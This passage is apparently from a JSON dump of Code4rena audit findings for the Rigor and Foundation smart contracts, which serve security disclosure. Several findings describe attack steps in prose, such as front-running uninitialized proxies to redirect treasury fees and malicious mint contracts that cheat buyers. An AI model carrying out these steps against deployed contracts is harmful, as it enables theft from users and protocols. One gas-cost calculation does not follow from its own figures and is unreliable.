https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L113  ## Tools Used vscode ## Recommended Mitigation Steps add event"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/41", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/39", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/38", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/37", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/36", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Admin role lockout", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/35", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged", "valid"], "target": "2022-08-rigor-findings", "body": "Admin role lockout"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/32", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/28", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/27", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/26", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/20", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Builder can lock in a temporarily low lender fee for all future projects", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/15", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged", "valid"], "target": "2022-08-rigor-findings", "body": "Builder can lock in a temporarily low lender fee for all future projects"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/14", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/12", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/10", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/8", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/7", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Incorrect initialization of smart contracts with Access Control issue", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/6", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFiProxy.sol#L216-L230 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L102-L119 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/DebtToken.sol#L43-L58 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Disputes.sol#L74-L81 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L92-L120 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L94-L105 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/ProjectFactory.sol#L45-L55   # Vulnerability details  ## Impact All next Impact depends on actions and attention from developers when deployed - Loss of funds  - Failure of the protocol, with the need for redeploy - Loss of control over protocol elements (some smart contracts) - The possibility of replacing contracts and settings with harmful ones And other things that come out of it...  ## Proof of Concept  For a proper understanding of Proof of Concept, you need to understand the following things: 1) Hardhat does not stop the process with a deploy and does not show failed transactions if they have occurred in some cases  2) Malicious agents can trace the protocol deployment transactions and insert their own transaction between them  Reason: - [During deploy TransparentUpgradeableProxy's](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFiProxy.sol#L216-L230) initialize method for initializing contracts not called. The third parameter responsible for this is an empty string. This causes the initialization process itself to be **delayed**  - Contract initialization methods have no check over who calls them Example [ProjectFactory.sol#L45-L55](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/ProjectFactory.sol#L45-L55)  **Also suitable for other contracts, strings are attached in Links to affected code **  Example of exploiting the vulnerability **Failure of the protocol, with the need for redeploy** && **Loss of control over protocol elements (some smart contracts)** : 1) User listen transaction in mempool, etherscan, transaction in block etc  2) Finds the moment of deployment and sends the transaction for setup his HomeFi address in Disputes contract:   Just he call initialize method and put his _homeFi parameter 3) In the event that hardhat tracked a failed transaction, the deployment will stop and you will need to start over. If the hardhead misses it and the developers do not check the result and the setting, access to this part will be lost and fix is needed  Example of exploiting the vulnerability **Loss of funds**: 1) User listen transaction in mempool, etherscan, transaction in block for listne when HomeFi will deployed 2) Send transaction for initialize [HomeFi](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L92-L120) with his _treasury address 3) Transfer the admin ownership the right to the real address to divert the eyes 4) The address of the treasury remains with the attacker 5) The protocol fees (fee) will be [transfered](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L443) to the attacker's address until it is detected   ## Recommended Mitigation Steps  Carry out checks at the initialization stage or redesign the deployment process with the initialization of contracts during deployment  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/3", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/1", "labels": [], "target": "2022-08-rigor-findings", "body": "Agreements & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/289", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/287", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/285", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/284", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/282", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/281", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "`mintFromFixedPriceSale` for a custom contract can lead to users losing funds", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/279", "labels": ["bug", "2 (Med Risk)"], "target": "2022-08-foundation-findings", "body": "`mintFromFixedPriceSale` for a custom contract can lead to users losing funds"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/278", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/277", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/276", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/274", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/273", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/272", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/271", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/264", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/262", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/261", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/257", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/256", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/255", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/253", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/251", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/250", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/249", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "User can steal the referral fee when minting systematically at the cost of nft creator and project.", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/247", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "User can steal the referral fee when minting systematically at the cost of nft creator and project."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/246", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/245", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/242", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/239", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/234", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/233", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Revenue split inconsistency in `_getFees`", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/232", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "Revenue split inconsistency in `_getFees`"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/226", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/225", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/224", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/222", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/219", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/214", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/212", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Malicious Creator can steal from collectors upon minting with a custom NFT contract", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/211", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-foundation-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/nftDropMarket/NFTDropMarketFixedPriceSale.sol#L207   # Vulnerability details  # Malicious Creator can steal from collectors upon minting with a custom NFT contract  In the case of a fixed price sale where `nftContract` is a custom NFT contract that adheres to `INFTDropCollectionMint`, a malicious creator can set a malicious implementation of `INFTDropCollectionMint.mintCountTo()` that would result in collectors calling this function losing funds without receiving the expected amount of NFTs.  ## Impact  Medium   ## Proof Of Concept  Here is a [foundry test](https://gist.github.com/joestakey/4b13c7ae6029332da6eaf63b9d2a38bd) that shows a fixed price sale with a malicious NFT contract, where a collector pays for 10 NFTs while only receiving one. It can be described as follow:  - A creator creates a malicious `nftContract` with `mintCountTo` minting only one NFT per call, regardless of the value of `count`  - The creator calls `NFTDropMarketFixedPriceSale.createFixedPriceSale()` to create a sale for `nftContract`, with `limit` set to `15`.  - Bob is monitoring the `CreateFixedPriceSale` event. Upon noticing `CreateFixedPriceSale(customERC721, Alice, price, limit)`, he calls `NFTDropMarketFixedPriceSale.mintFromFixedPriceSale(customERC721, count == 10,)`. He pays the price of `count = 10` NFTs, but because of the logic in `mintCountTo`, only receives one NFT.  Note that `mintCountTo` can be implemented in many malicious ways, this is only one example. Another implementation could simply return `firstTokenId` without performing any minting.  ## Tools Used  Manual Analysis, Foundry  ## Mitigation  The problem here lies in the implementation of `INFTDropCollectionMint(nftContract).mintCountTo()`. You could add an additional check in `NFTDropMarketFixedPriceSale.mintCountTo()` using `ERC721(nftContract).balanceOf()`.   ```diff + uint256 balanceBefore = IERC721(nftContract).balanceOf(msg.sender); 207:     firstTokenId = INFTDropCollectionMint(nftContract).mintCountTo(count, msg.sender); + uint256 balanceAfter = IERC721(nftContract).balanceOf(msg.sender); + require(balanceAfter == balanceBefore + count, \"minting failed\") ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/210", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/209", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/208", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/207", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/206", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/205", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/202", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/201", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/199", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/198", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/197", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/196", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/194", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/192", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/188", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/187", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/185", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/184", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "NFT of NFT collection or NFT drop collection can be locked when calling _mint or mintCountTo function to mint it to a contract that does not support ERC721 protocol", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/183", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-foundation-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L262-L274 https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L171-L187   # Vulnerability details  ## Impact When calling the following `_mint` or `mintCountTo` function for minting an NFT of a NFT collection or NFT drop collection, the OpenZeppelin's `ERC721Upgradeable` contract's [`_mint`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L284-L296) function is used to mint the NFT to a receiver. If such receiver is a contract that does not support the ERC721 protocol, the NFT will be locked and cannot be retrieved.  https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L262-L274 ```   function _mint(string calldata tokenCID) private onlyCreator returns (uint256 tokenId) {     require(bytes(tokenCID).length != 0, \"NFTCollection: tokenCID is required\");     require(!cidToMinted[tokenCID], \"NFTCollection: NFT was already minted\");     unchecked {       // Number of tokens cannot overflow 256 bits.       tokenId = ++latestTokenId;       require(maxTokenId == 0 || tokenId <= maxTokenId, \"NFTCollection: Max token count has already been minted\");       cidToMinted[tokenCID] = true;       _tokenCIDs[tokenId] = tokenCID;       _mint(msg.sender, tokenId);       emit Minted(msg.sender, tokenId, tokenCID, tokenCID);     }   } ```  https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L171-L187 ```   function mintCountTo(uint16 count, address to) external onlyMinterOrAdmin returns (uint256 firstTokenId) {     require(count != 0, \"NFTDropCollection: `count` must be greater than 0\");      unchecked {       // If +1 overflows then +count would also overflow, unless count==0 in which case the loop would exceed gas limits       firstTokenId = latestTokenId + 1;     }     latestTokenId = latestTokenId + count;     require(latestTokenId <= maxTokenId, \"NFTDropCollection: Exceeds max tokenId\");      for (uint256 i = firstTokenId; i <= latestTokenId; ) {       _mint(to, i);       unchecked {         ++i;       }     }   } ```  For reference, [OpenZeppelin's documentation for `_mint`](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#ERC721-_mint-address-uint256-) states: \"Usage of this method is discouraged, use _safeMint whenever possible\".  ## Proof of Concept The following steps can occur when minting an NFT of a NFT collection or NFT drop collection. 1. The [`_mint`](https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L262-L274) or [`mintCountTo`](https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L171-L187) function is called with `msg.sender` or the `to` input corresponding to a contract. 2. The OpenZeppelin's `ERC721Upgradeable` contract's [`_mint`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L284-L296) function is called with `msg.sender` or `to` used in Step 1 as the receiver address. 3. Since calling the OpenZeppelin's `ERC721Upgradeable` contract's [`_mint`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L284-L296) function does not execute the same contract's [`_checkOnERC721Received`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L400-L422) function, it is unknown if the receiving contract inherits from the `IERC721ReceiverUpgradeable` interface and implements the `onERC721Received` function or not. It is possible that the receiving contract does not support the ERC721 protocol, which causes the minted NFT to be locked.  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L271 can be changed to the following code. ``` _safeMint(msg.sender, tokenId); ```  Also, https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L182 can be changed to the following code. ``` _safeMint(to, i); ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/181", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/180", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "NFTDropMarket does not track self-destructed NFTCollections", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/179", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged", "old-submission-method"], "target": "2022-08-foundation-findings", "body": "NFTDropMarket does not track self-destructed NFTCollections"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/175", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/174", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/173", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/172", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/171", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/170", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/168", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-foundation-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/167", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-foundation-findings", "body": "QA Report"}, {"title": "NFT creator sales revenue recipients can steal gas", "html_url": "https://github.com/code-423n4/2022-08-foundation-findings/issues/165", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-foundation-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L130   # Vulnerability details  ## Impact  Selling a NFT with `NFTDropMarketFixedPriceSale.mintFromFixedPriceSale` distributes the revenue from the sale to various recipients with the `MarketFees._distributeFunds` function.  Recipients:  - NFT creator(s) - NFT seller - Protocol - Buy referrer (optional)  It is possible to have multiple NFT creators. Sale revenue will be distributed to each NFT creator address. Revenue distribution is done by calling `SendValueWithFallbackWithdraw._sendValueWithFallbackWithdraw` and providing an appropriate gas limit to prevent consuming too much gas. For the revenue distribution to the seller, protocol and the buy referrer, a gas limit of `SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT = 20_000` is used. However, for the creators, a limit of `SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS = 210_000` is used. This higher amount of gas is used if `PercentSplitETH` is used as a recipient.  A maximum of `MAX_ROYALTY_RECIPIENTS = 5` NFT creator recipients are allowed.  For example, a once honest NFT collection and its 5 royalty creator recipients could turn \"malicious\" and could \"steal\" gas from NFT buyers on each NFT sale and therefore grief NFT sales. On each NFT sell, the 5 creator recipients (smart contracts) could consume the full amount of `SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS = 210_000` forwarded gas. Totalling `5 * 210_000 = 1_050_000` gas. With a gas price of e.g. `20 gwei`, this equals to additional gas costs of `21_000_000 gwei = 0.028156 eth`, with a `ETH` price of `2000`, this would total to ~`56.31 $` additional costs.  ## Proof of Concept  [mixins/shared/MarketFees.sol#L130](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L130)  ```solidity /**   * @notice Distributes funds to foundation, creator recipients, and NFT owner 